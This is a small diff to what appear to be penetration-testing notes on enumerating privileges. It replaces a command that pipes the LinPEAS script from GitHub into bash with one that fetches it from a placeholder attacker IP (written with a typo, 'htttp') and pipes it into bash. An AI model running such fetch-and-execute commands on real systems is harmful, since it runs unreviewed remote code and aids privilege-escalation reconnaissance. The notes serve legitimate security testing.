@@ -14,4 +14,4 @@ Run the following one liners to enumerate your privs on the box:
 
 ### Linpeas
 
-`curl -sL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linpeas/linpeas.sh | bash`
+`curl -sL htttp://<myip>/linpeas.sh | bash`
